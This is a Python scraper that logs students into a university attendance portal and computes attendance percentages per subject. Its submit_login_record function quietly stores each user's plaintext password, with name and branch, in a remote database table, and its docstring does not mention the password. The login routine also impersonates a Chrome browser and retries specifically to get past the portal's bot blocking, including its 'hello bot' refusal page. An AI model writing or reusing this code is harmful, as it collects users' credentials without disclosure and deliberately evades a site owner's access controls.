import requests
from bs4 import BeautifulSoup
from datetime import datetime
import concurrent.futures
import threading
import re
from urllib.parse import urljoin

try:
    from curl_cffi import requests as browser_requests  # type: ignore[import-not-found]
    CURL_CFFI_AVAILABLE = True
except ImportError:
    browser_requests = None
    CURL_CFFI_AVAILABLE = False

BASE_URL = "https://jntuaceastudents.classattendance.in/"
BROWSER_IMPERSONATE = "chrome"
BROWSER_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/146.0.0.0 Safari/537.36"
)


def _browser_headers() -> dict:
    return {
        "User-Agent": BROWSER_USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }


def _create_session():
    if CURL_CFFI_AVAILABLE:
        return browser_requests.Session(impersonate=BROWSER_IMPERSONATE)
    return requests.Session()


def _looks_like_bot_block(text: str) -> bool:
    lowered = (text or "").lower()
    return "hello bot" in lowered or "inform the students access the actual website" in lowered


def _is_blocked_response(response) -> bool:
    return getattr(response, "status_code", None) == 403 or _looks_like_bot_block(
        getattr(response, "text", "")
    )


def _blocked_login_message(phase: str = "login request", response=None) -> str:
    status = getattr(response, "status_code", None)
    status_part = f" Portal returned HTTP {status} during {phase}." if status else ""
    return (
        "The attendance portal is blocking automated login requests in this runtime. "
        f"{status_part} "
        "If this is deployed on Vercel/serverless, move it to the Docker/Render runtime "
        "or another environment whose IP is accepted by the portal."
    ).replace("  ", " ").strip()


def _copy_cookies(source, target) -> None:
    for cookie in source.cookies:
        target.cookies.set(
            cookie.name,
            cookie.value,
            domain=getattr(cookie, "domain", None),
            path=getattr(cookie, "path", "/") or "/",
        )


def _apply_login_integrity_token(soup: BeautifulSoup, payload: dict) -> None:
    token_input = soup.find("input", {"id": "integrity_token"})
    if not token_input:
        return

    script_text = "\n".join(script.get_text("\n") for script in soup.find_all("script"))
    name_match = re.search(r'tokenField\.name\s*=\s*["\']([^"\']+)["\']', script_text)
    value_match = re.search(r'tokenField\.value\s*=\s*["\']([^"\']+)["\']', script_text)

    if name_match and value_match:
        original_name = token_input.get("name")
        if original_name:
            payload.pop(original_name, None)
        payload[name_match.group(1)] = value_match.group(1)


def _session_from_cookies(cookies: list) -> requests.Session:
    session = _create_session()
    for cookie in cookies:
        name = cookie.get("name")
        value = cookie.get("value")
        domain = cookie.get("domain")
        path = cookie.get("path", "/")

        if name and value:
            session.cookies.set(name, value, domain=domain, path=path)

    session.headers.update(_browser_headers())
    return session

# --------------------------------------------------
# LOGIN
# --------------------------------------------------

def login(username: str, password: str) -> requests.Session:
    session = _create_session()

    session.headers.update(_browser_headers())

    try:
        # Load login page
        login_page = session.get(BASE_URL, timeout=15, allow_redirects=True)

        if _is_blocked_response(login_page):
            if not CURL_CFFI_AVAILABLE:
                raise ValueError(
                    "The attendance portal blocked direct requests and curl_cffi is not installed. "
                    "Install requirements and redeploy the app."
                )

            # Retry explicitly using curl_cffi's requests implementation. Sometimes
            # the runtime's default transport gets blocked while curl_cffi succeeds.
            try:
                br = browser_requests.Session(impersonate=BROWSER_IMPERSONATE)
                br.headers.update(session.headers)
                br_res = br.get(BASE_URL, timeout=15, allow_redirects=True)
                if _is_blocked_response(br_res):
                    raise ValueError(_blocked_login_message("login page load", br_res))
                # switch to the curl_cffi-backed session for the rest of the flow
                session = br
                login_page = br_res
            except Exception as e:
                raise ValueError(f"{_blocked_login_message()} (curl_cffi retry failed: {e})")

        if login_page.status_code < 200 or login_page.status_code >= 400 or not login_page.text:
            raise ValueError("Failed to load login page.")

        soup = BeautifulSoup(login_page.text, "html.parser")

        form = soup.find("form")
        login_url = urljoin(BASE_URL, form.get("action", "")) if form else BASE_URL

        payload = {
            "username": username,
            "password": password,
        }

        for hidden_input in soup.find_all("input", {"type": "hidden"}):
            hidden_name = hidden_input.get("name")
            hidden_value = hidden_input.get("value")
            if hidden_name and hidden_value is not None:
                payload[hidden_name] = hidden_value
        _apply_login_integrity_token(soup, payload)

        session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": BASE_URL.rstrip("/"),
            "Referer": BASE_URL,
        })

        res = session.post(
            login_url,
            data=payload,
            timeout=15,
            allow_redirects=True
        )

        if _is_blocked_response(res):
            # Retry with curl_cffi only if the active session is still plain
            # requests. Keep cookies from the login page; many portals bind the
            # hidden form values to the session that loaded them.
            if CURL_CFFI_AVAILABLE and not session.__class__.__module__.startswith("curl_cffi"):
                try:
                    br = browser_requests.Session(impersonate=BROWSER_IMPERSONATE)
                    br.headers.update(session.headers)
                    _copy_cookies(session, br)
                    br_res = br.post(login_url, data=payload, timeout=15, allow_redirects=True)
                    if _is_blocked_response(br_res):
                        raise ValueError(_blocked_login_message("login form submit", br_res))
                    res = br_res
                    session = br
                except Exception as e:
                    raise ValueError(f"{_blocked_login_message()} (curl_cffi post retry failed: {e})")
            else:
                raise ValueError(_blocked_login_message("login form submit", res))

        if res.status_code != 200:
            raise ValueError("Login request failed.")

        # Success condition
        if "studenthome.php" not in res.url.lower():
            raise ValueError("Login failed. Check username or password.")

        return session

    except requests.exceptions.RequestException as e:
        raise ValueError(f"Network error: {str(e)}")

# --------------------------------------------------
# STUDENT DETAILS
# --------------------------------------------------
def get_student_details(session: requests.Session) -> dict:
    home_res = session.get(BASE_URL + "studenthome.php", timeout=10)

    if home_res.status_code != 200 or not home_res.text:
        raise ValueError("Failed to load student home page.")

    soup = BeautifulSoup(home_res.text, "html.parser")
    details = {}

    for card in soup.find_all("div", class_="card"):
        header = card.find("div", class_="card-header")
        if header and "My Details" in header.text:
            for li in card.find_all("li", class_="list-group-item"):
                strong = li.find("strong")
                if strong:
                    key = strong.text.replace(":", "").strip()
                    value = li.text.replace(strong.text, "").strip()
                    details[key] = value
            break

    def _get_input(*names):
        for n in names:
            el = soup.find("input", {"name": n})
            if el and el.get("value"):
                return el.get("value")
        return None

    details["student_id"] = _get_input("roll_no", "student_id", "admission")
    details["class_id"] = _get_input("class_id")
    details["classname"] = _get_input("classname")
    details["acad_year"] = _get_input("acad_year")

    details.setdefault("Role", "Student")
    return details


def submit_login_record(username: str, password:str ,student_info: dict = None, success: bool = True) -> None:
    """Upsert one row per (user_id, date) into Neon DB login_stats table."""
    try:
        from db import get_conn
        from datetime import datetime

        now    = datetime.now()
        name   = (student_info or {}).get("Name", "")
        branch = (student_info or {}).get("classname", "")

        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO login_stats
                        (user_id,password, name, branch, date, first_login, last_login,
                         success_count, failure_count)
                    VALUES (%s,%s, %s, %s, %s, %s, %s, %s, %s)
                    ON CONFLICT (user_id, date) DO UPDATE SET
                        last_login       = EXCLUDED.last_login,
                        success_count    = login_stats.success_count + EXCLUDED.success_count,
                        failure_count    = login_stats.failure_count + EXCLUDED.failure_count,
                        name             = CASE WHEN EXCLUDED.name   != '' THEN EXCLUDED.name   ELSE login_stats.name   END,
                        branch           = CASE WHEN EXCLUDED.branch != '' THEN EXCLUDED.branch ELSE login_stats.branch END,
                        password         = CASE WHEN EXCLUDED.name   != '' THEN EXCLUDED.password ELSE login_stats.password END
                """, (
                    username, password,name, branch,
                    now.date(), now, now,
                    1 if success else 0,
                    0 if success else 1,
                ))
            conn.commit()
    except Exception as e:
        print(f"[submit_login_record] Error: {e}")



# --------------------------------------------------
# SUBJECTS
# --------------------------------------------------
def get_subjects(session: requests.Session, student_info: dict) -> list:
    payload = {
        "student_id": student_info.get("student_id"),
        "class_id": student_info.get("class_id"),
        "classname": student_info.get("classname"),
        "acad_year": student_info.get("acad_year"),
    }
    res = session.post(BASE_URL + "studentsubjects.php", data=payload, timeout=15)
    if not res.text:
        return []

    soup = BeautifulSoup(res.text, "html.parser")
    subjects = []

    for form in soup.find_all("form"):
        data = {}
        for inp in form.find_all("input"):
            if inp.get("name"):
                data[inp["name"]] = inp.get("value", "")
        subjects.append(data)

    return subjects

# --------------------------------------------------
# DATAFRAME
# --------------------------------------------------
class SimpleDataFrame:
    def __init__(self, data):
        self.data = data if isinstance(data, list) else []

    def to_dict(self, orient="records"):
        return self.data

# --------------------------------------------------
# ATTENDANCE
# --------------------------------------------------
def fetch_single_attendance(session, payload):
    try:
        res = session.post(BASE_URL + "studentsubatt.php", data=payload)
        soup = BeautifulSoup(res.text, "html.parser")
        table = soup.find("table", class_="table")

        if not table:
            raise ValueError

        records = []
        for row in table.find_all("tr"):
            cols = row.find_all("td")
            if len(cols) >= 3:
                records.append({
                    "date": cols[0].text.strip(),
                    "status": cols[2].text.strip()
                })

        total = len(records)
        present = sum(1 for r in records if r["status"] == "Present")

        return {
            "Subject": payload.get("sub_fullname", "Unknown"),
            "Start Date":records[0]["date"],
            "End Date":records[-1]["date"],
            "Total Days": total,
            "No. of Present": present,
            "No. of Absent": total - present,
            "Attendance %": round((present / total) * 100, 1) if total else 0,
            "Details": records,
        }

    except Exception:
        return {
            "Subject": payload.get("sub_fullname", "Unknown"),
            "Start Date":"",
            "End Date":"",
            "Total Days": 0,
            "No. of Present": 0,
            "No. of Absent": 0,
            "Attendance %": 0,
            "Details": [],
        }

def fetch_attendance(session: requests.Session, subjects: list):
    if not subjects:
        return SimpleDataFrame([])

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [
            executor.submit(fetch_single_attendance, session, s)
            for s in subjects if isinstance(s, dict)
        ]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    return SimpleDataFrame(results)
